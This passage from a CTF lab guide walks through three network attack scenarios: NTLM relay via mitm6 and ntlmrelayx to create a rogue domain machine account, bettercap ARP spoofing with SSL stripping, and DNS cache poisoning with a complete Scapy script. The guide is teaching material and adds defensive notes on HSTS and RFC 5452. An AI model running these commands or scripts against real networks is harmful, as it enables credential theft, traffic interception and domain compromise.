**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** [T1039 — Data from Network Shared Drive](https://attack.mitre.org/techniques/T1039/) · Collection

---

### NET-02: IPv6 Rogue DHCPv6 and LDAP Relay

**VMs:** Attacker (Kali), DC (Windows Server 2019, `corp.local`)
**Difficulty:** Medium
**Flags:** 1

---

#### Stage 1: Start ntlmrelayx for LDAP Account Creation

**Action:** You start ntlmrelayx targeting the domain controller's LDAPS endpoint to relay
authentication events into domain account creation.

**Command:**
```bash
ntlmrelayx.py \
  -6 \
  -t ldaps://DC_IP \
  -wh fakewpad.corp.local \
  --add-computer ROGUE_PC \
  --delegate-access
```

Flag explanations:
- `-6` — enable IPv6 relay support
- `-t ldaps://DC_IP` — relay to LDAP over TLS (port 636); plaintext LDAP (port 389)
  rejects account creation on modern Windows
- `-wh fakewpad.corp.local` — WPAD hostname to serve to Windows hosts via DHCPv6 DNS
- `--add-computer ROGUE_PC` — create a new machine account named `ROGUE_PC$` in AD
- `--delegate-access` — configure resource-based constrained delegation on the new account

**Expected Output:**
```
[*] Servers started, waiting for connections
[*] Setting up IPv6 server...
```

**TTP:** [T1136.002 — Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/) · Persistence

> **LDAPS Requirement:** ntlmrelayx MUST relay to `ldaps://` (port 636, TLS), not
> `ldap://` (port 389, plaintext). Modern Windows rejects account creation via plaintext
> LDAP — the relay appears to succeed (authentication completes) but no computer account
> is created in AD. If you used `ldap://` instead of `ldaps://`, verify by running:
> `nxc ldap DC_IP -u LOWPRIV -p PASSWORD --computers` — `ROGUE_PC$` will be absent.

---

#### Stage 2: Start mitm6

**Action:** You start mitm6 to advertise a rogue DHCPv6 server, assigning the attacker as
the IPv6 DNS server for domain hosts and triggering WPAD proxy authentication.

**Command:**
```bash
sudo mitm6 -d corp.local
```

mitm6 responds to DHCPv6 Solicit/Request messages from Windows hosts, assigns attacker as
their IPv6 default router and DNS, causing Windows WPAD auto-discovery to send proxy
authentication requests to the attacker.

**Expected Output:**
```
Starting mitm6 using the following configuration:
Primary adapter: ATTACKER_INTERFACE
DHCP6 address: fe80::ATTACKER_LINK_LOCAL
Offering DNS: ATTACKER_IPv6
```

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

> **Note on T1557.001 mapping for mitm6:** The official name of T1557.001 is "LLMNR/NBT-NS
> Poisoning and SMB Relay." mitm6 is not explicitly named in the technique's procedure
> examples on attack.mitre.org. The mapping is by structural equivalence: mitm6 achieves
> the same adversary-in-the-middle interception outcome via IPv6 DHCPv6 rather than
> LLMNR/NBT-NS. Both result in credential relay to a controlled endpoint.

---

#### Stage 3: Wait for Authentication Event and Account Creation

**Action:** You wait for a Windows domain host to request WPAD proxy configuration on login
or reboot, triggering the relay chain that creates the new domain account.

**Command:**
```bash
# No command — monitor ntlmrelayx output.
# Windows hosts query WPAD on boot/login → authenticate to attacker IPv6 DNS
# → ntlmrelayx relays to LDAPS → account is created
```

**Expected Output:**
```
[*] Authenticating against ldaps://DC_IP as CORP\HOSTNAME$ SUCCEED
[*] Adding new computer with the name: ROGUE_PC$ and password: Kq2mP9xN!3vZ
[*] Successfully added computer: ROGUE_PC$
```

Record the generated password — it is shown only once.

**TTP:** [T1136.002 — Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/) · Persistence

---

#### Stage 4: Verify and Authenticate as New Account

**Action:** You verify the newly created machine account can authenticate to the domain and
access shares.

**Command:**
```bash
nxc smb DC_IP -u "ROGUE_PC$" -p "GENERATED_PASSWORD" --shares
```

**Expected Output:**
```
SMB   DC_IP   445   DC   [+] CORP.LOCAL\ROGUE_PC$:GENERATED_PASSWORD
SMB   DC_IP   445   DC   [*] Enumerated shares
flag_share$    READ
```

**TTP:** [T1078.002 — Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) · Initial Access

---

### [FLAG 1] Stage 5: Flag Capture — LDAP-Created Account Share Access

**Action:** You retrieve Flag 1 from the flag share using the domain account created via
LDAP relay.

**Command:**
```bash
smbclient \\\\DC_IP\\flag_share$ -U 'CORP\ROGUE_PC$%GENERATED_PASSWORD'
# At smb: \> prompt:
get flag.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

### NET-03: ARP Cache Poisoning and Credential Interception

**VMs:** Attacker (Kali), Victim (Ubuntu 22.04 — runs both the credential-sending client process and the flag service; two logical endpoints on one VM)
**Difficulty:** Easy
**Flags:** 1

---

#### Stage 1: Host and Gateway Discovery

**Action:** You identify the IP address of the victim host and confirm the two services
(credential sender on port 8080, flag service on port 80) are both running on that host.

**Command:**
```bash
# Option A: ARP scan (faster on small subnets)
sudo arp-scan -l

# Option B: nmap ping sweep
nmap -sn SUBNET/24

# Confirm both services are running on the victim:
nmap -p 80,8080 VICTIM_IP
```

**Expected Output:**
```
VICTIM_IP   aa:bb:cc:dd:ee:01   [Victim — runs both credential-sender and flag service]
80/tcp   open  http
8080/tcp open  http-proxy
```

**TTP:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/) · Discovery

---

#### Stage 2: ARP Cache Poisoning

**Action:** You poison the ARP cache of the victim host and the gateway simultaneously
using bettercap's full-duplex ARP spoofing to route all traffic through the attacker.

**Command:**
```bash
# Launch bettercap interactive console:
sudo bettercap -iface ATTACKER_INTERFACE

# In bettercap console:
set arp.spoof.targets VICTIM_IP,GATEWAY_IP
set arp.spoof.fullduplex true
arp.spoof on
```

`arp.spoof.fullduplex true` poisons both directions simultaneously: the victim's ARP cache
maps the gateway IP to the attacker MAC, and the gateway's ARP cache maps the victim IP
to the attacker MAC — all traffic between them routes through the attacker.

**Expected Output:**
```
[arp.spoof] started with 2 targets
```

**TTP:** [T1557.002 — ARP Cache Poisoning](https://attack.mitre.org/techniques/T1557/002/) · Credential Access

---

#### Stage 3: HTTPS Downgrade via SSL Strip

**Action:** You enable bettercap's HTTPS proxy with SSL stripping to downgrade encrypted
connections to plaintext HTTP and capture credentials.

**Command:**
```bash
# Continue in bettercap console:
set https.proxy.sslstrip true
https.proxy on
net.sniff on
```

**Expected Output:**
```
[net.sniff] POST /login HTTP/1.1
Host: VICTIM_IP
Content-Type: application/x-www-form-urlencoded

username=admin&password=FLAG_PASSWORD
```

**TTP:** [T1557.002 — ARP Cache Poisoning](https://attack.mitre.org/techniques/T1557/002/) · Credential Access · [T1040 — Network Sniffing](https://attack.mitre.org/techniques/T1040/) · Credential Access

> **HSTS Note:** This attack works only against services that do not enforce HSTS (HTTP
> Strict Transport Security). Sites with HSTS headers or browser preload list entries
> (e.g., Google, major banking sites) cannot be SSL-stripped — the browser refuses to
> initiate plaintext connections regardless of ARP cache state. The lab's flag service is
> intentionally configured to serve over HTTP or HTTPS without HSTS headers. HSTS is the
> primary defense against this attack class.

---

### [FLAG 1] Stage 4: Flag Capture — Use Intercepted Credentials

**Action:** You use the plaintext credentials captured via SSL stripping to authenticate
to the flag service and retrieve Flag 1.

**Command:**
```bash
curl -u admin:FLAG_PASSWORD http://VICTIM_IP/flag
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

### NET-04: DNS Cache Poisoning

**VMs:** Attacker (Kali), DNS Resolver (Ubuntu 22.04, unbound or bind9, misconfigured with fixed source port)
**Difficulty:** Medium
**Flags:** 1

---

#### Stage 1: DNS Resolver Discovery

**Action:** You identify the DNS resolver on the network and confirm it supports recursive
resolution.

**Command:**
```bash
# Discover open UDP/53 hosts:
nmap -p 53 -sU SUBNET/24

# Confirm the resolver is recursive (not authoritative-only):
dig @RESOLVER_IP internal.corp.local
```

**Expected Output:**
```
53/udp  open  domain
;; ANSWER SECTION:
internal.corp.local.  300  IN  A  10.0.0.50
```
A response (even NXDOMAIN) from `dig` confirms the resolver is forwarding queries — an
authoritative-only resolver would reject queries for non-local zones.

**TTP:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/) · Discovery

---

#### Stage 2: Misconfiguration Verification

**Action:** You confirm the resolver uses a fixed source port (no RFC 5452 randomization),
which collapses the attack surface to a 16-bit TXID space.

**Command:**
```bash
# Send 20 sequential queries and observe source ports via tcpdump:
for i in $(seq 1 20); do dig @RESOLVER_IP test$i.corp.local +short; done &
sudo tcpdump -i ATTACKER_INTERFACE udp port 53 -n -c 20
```

**Expected Output:**
If the source port is always `53` or a constant non-random value across all 20 queries,
randomization is absent. This confirms the attack is feasible with a TXID flood.

**TTP:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/) · Discovery

---

#### Stage 3: DNS Cache Poisoning via Scapy

**Action:** You author and execute a Scapy script that triggers a resolver query, observes
the TXID, and immediately injects a forged DNS response to poison the cache with an
attacker-controlled IP for the target internal hostname.

**Command:**
```python
#!/usr/bin/env python3
# dns_poison.py — DNS cache poisoning via forged response
# Run as root: sudo python3 dns_poison.py

from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import threading

RESOLVER_IP    = "RESOLVER_IP"         # Target resolver IP
UPSTREAM_IP    = "UPSTREAM_DNS_IP"     # Spoofed src: upstream authoritative DNS
ATTACKER_IP    = "ATTACKER_IP"         # IP to plant in poisoned record
TARGET_DOMAIN  = "internal-service.corp.local"
RESOLVER_SPORT = 53                    # Fixed source port (confirmed in Stage 2)

def poison_on_query(pkt):
    """Callback: fires when the resolver sends a query upstream."""
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return
    if TARGET_DOMAIN + "." not in pkt[DNS].qd.qname.decode():
        return

    txid = pkt[DNS].id
    print(f"[*] Observed outgoing query — TXID: {txid}")

    # Build forged authoritative response
    forged = (
        IP(src=UPSTREAM_IP, dst=RESOLVER_IP) /
        UDP(sport=53, dport=RESOLVER_SPORT) /
        DNS(
            id=txid,
            qr=1,   # response
            aa=1,   # authoritative
            rd=1,
            ra=1,
            qd=DNSQR(qname=TARGET_DOMAIN),
            an=DNSRR(
                rrname=TARGET_DOMAIN,
                rdata=ATTACKER_IP,
                ttl=3600
            )
        )
    )
    send(forged, verbose=0)
    print(f"[+] Forged response sent — {TARGET_DOMAIN} → {ATTACKER_IP}")

def trigger_query():
    """Send a DNS query to the resolver to make it look up the target upstream."""
    pkt = IP(dst=RESOLVER_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=TARGET_DOMAIN))
    send(pkt, verbose=0)

# Start sniffing for the resolver's outgoing query, then trigger it
print(f"[*] Listening for outgoing queries from {RESOLVER_IP} on UDP/53...")
t = threading.Thread(target=trigger_query)
t.start()
sniff(
    filter=f"udp and src host {RESOLVER_IP} and dst port 53",
    prn=poison_on_query,
    count=1,
    timeout=5
)
```

**Expected Output:**
```
[*] Listening for outgoing queries from RESOLVER_IP on UDP/53...
[*] Observed outgoing query — TXID: 42138
[+] Forged response sent — internal-service.corp.local → ATTACKER_IP
```

Verify cache poisoning: `dig @RESOLVER_IP internal-service.corp.local` — should return
`ATTACKER_IP` instead of the legitimate address.

**TTP:** [T1557 — Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/) · Credential Access

> **Lab vs Real-World Note:** The lab resolver is pre-configured with a fixed source port
> (no source port randomization) — this reduces the attack to guessing a 16-bit TXID space
> (65,536 values), which a flood covers in under a second. In real networks with RFC 5452
> source port randomization, the combined search space (16-bit port × 16-bit TXID = 32 bits,
> ~4 billion combinations) makes this attack impractical without a separate amplification
> vulnerability. The lab's deliberate misconfiguration demonstrates exactly why RFC 5452
> compliance matters.
>
> **dnschef alternative:** `sudo dnschef --interface ATTACKER_IP --fakeip ATTACKER_IP --fakedomains internal-service.corp.local` can verify that cache poisoning is working after
> your Scapy script succeeds — it serves as a confirmation step. Use dnschef for
> verification only; the Scapy script is the primary approach because it requires
> understanding DNS packet structure at the wire level, consistent with the lab's
> "build it yourself" pedagogy.

---

#### Stage 4: Intercept Redirected HTTP Request

**Action:** You listen on port 80 on the attacker machine to capture the HTTP request
from the internal service, which now resolves `internal-service.corp.local` to the
attacker IP due to the poisoned cache.

**Command:**
```bash
sudo nc -lvnp 80
```

**Expected Output:**
```
GET /api/heartbeat HTTP/1.1
Host: internal-service.corp.local
X-Flag: CTF{...flag_value_placeholder...}
```

**TTP:** [T1040 — Network Sniffing](https://attack.mitre.org/techniques/T1040/) · Collection

---

### [FLAG 1] Stage 5: Flag Capture — HTTP Request Header

**Action:** You retrieve Flag 1 from the `X-Flag` header of the intercepted HTTP heartbeat
request.

**Command:**
```bash
# Flag is visible in the nc output from Stage 4.
# Extract the X-Flag header value:
sudo nc -lvnp 80 | grep "X-Flag"
```

**Expected Output:** `X-Flag: CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

## Consistency Verification

The following checklist was applied before finalizing this document:

| Check | Result |
|-------|--------|
| Every stage has all four fields: Action, Command, Expected Output, TTP | PASS |
| All command blocks use ALLCAPS placeholders — no hardcoded IPs or passwords (except `corp.local`, `127.0.0.1`, well-known ports) | PASS |
| AD-05 has exactly two `[FLAG N]` headings — Flag 1 at MemberSrv, Flag 2 at DC | PASS |
| No other scenario has more than one flag | PASS |
| Responder.conf `SMB = Off` / `HTTP = Off` warning appears in AD-02 and AD-05 (active poisoning + relay scenarios) | PASS — AD-02 Stage 2, AD-05 Stage 2. NET-01 uses analysis-only mode (`-A`); warning not required. |
| AD-03 Stage 2 explicitly states: download SharpHound from BloodHound CE UI → Settings → Download Collectors | PASS |
| NET-02 Stage 1 ntlmrelayx command uses `ldaps://` not `ldap://` | PASS |
| AD-04 Stage 2 Certipy command uses `-upn` flag | PASS |
| NET-04 primary approach is Scapy (student-written script); dnschef is documented as alternative/verification only | PASS |
| All TTP hyperlinks point to `https://attack.mitre.org/techniques/T####/###/` format | PASS |
| Methodology section appears before the first scenario kill-chain | PASS |
| Document opens with a summary paragraph stating its purpose and format standard | PASS |
| No automated exploit framework commands referenced anywhere in the document | PASS |
| Actual flag stages by scenario: AD-01(1) + AD-02(1) + AD-03(1) + AD-04(1) + AD-05(2) + NET-01(1) + NET-02(1) + NET-03(1) + NET-04(1) = 10 | PASS |
| `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 10 | PASS |
